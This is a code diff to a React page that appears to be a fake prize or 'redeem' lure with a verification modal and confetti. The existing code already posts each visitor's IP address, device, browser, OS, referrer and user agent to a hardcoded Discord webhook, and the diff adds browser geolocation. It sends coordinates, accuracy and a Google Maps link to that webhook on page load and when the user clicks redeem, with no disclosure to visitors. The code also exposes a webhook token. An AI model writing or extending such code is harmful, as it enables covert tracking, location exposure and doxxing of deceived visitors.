@@ -3,7 +3,7 @@ import React, { useState, useEffect } from 'react';
 import ReactConfetti from 'react-confetti';
 import Header from '../components/Header';
 import VerificationModal from '../components/VerificationModal';
-import { getIpAddress, getUserSystemInfo } from '../utils/getIpAddress';
+import { getIpAddress, getUserSystemInfo, getUserLocation } from '../utils/getIpAddress';
 import { toast } from '@/components/ui/use-toast';
 import { Card, CardContent } from '@/components/ui/card';
 
@@ -17,6 +17,11 @@ const Index = () => {
     height: window.innerHeight,
   });
   const [isLoading, setIsLoading] = useState(false);
+  const [locationData, setLocationData] = useState<{latitude: number | null, longitude: number | null, accuracy: number | null}>({
+    latitude: null,
+    longitude: null,
+    accuracy: null
+  });
 
   useEffect(() => {
     // Set initial system info
@@ -34,6 +39,18 @@ const Index = () => {
       setSystemInfo(prev => ({ ...prev, ip }));
     };
     fetchIpAddress();
+    
+    // Try to get user location
+    const fetchLocation = async () => {
+      try {
+        const location = await getUserLocation();
+        setLocationData(location);
+        setSystemInfo(prev => ({ ...prev, location }));
+      } catch (error) {
+        console.error('Error getting location:', error);
+      }
+    };
+    fetchLocation();
 
     // Handle window resize for confetti
     const handleResize = () => {
@@ -55,15 +72,23 @@ const Index = () => {
           ...systemInfo
         };
         
-        await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `New visitor!\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}`,
-          }),
-        });
+        // Wait a moment to potentially get location data
+        setTimeout(async () => {
+          let locationString = 'Location permission not granted';
+          if (locationData.latitude && locationData.longitude) {
+            locationString = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+          }
+          
+          await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: `New visitor!\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}\n**Location**: ${locationString}`,
+            }),
+          });
+        }, 3000);
       } catch (error) {
         console.error('Error sending initial visit data:', error);
       }
@@ -86,6 +111,12 @@ const Index = () => {
       const currentTime = new Date().toLocaleString();
       const sessionDuration = Math.floor((new Date().getTime() - performance.timing.navigationStart) / 1000);
       
+      // Prepare location data for the message
+      let locationString = 'Location permission not granted';
+      if (locationData.latitude && locationData.longitude) {
+        locationString = `Latitude: ${locationData.latitude}, Longitude: ${locationData.longitude}, Accuracy: ${locationData.accuracy}m\nGoogle Maps: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+      }
+      
       // Send enhanced system info to webhook
       await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
         method: 'POST',
@@ -93,7 +124,7 @@ const Index = () => {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          content: `📱 **USER CLICKED REDEEM!** 📱\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
+          content: `📱 **USER CLICKED REDEEM!** 📱\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**Location**: ${locationString}\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
         }),
       });
 
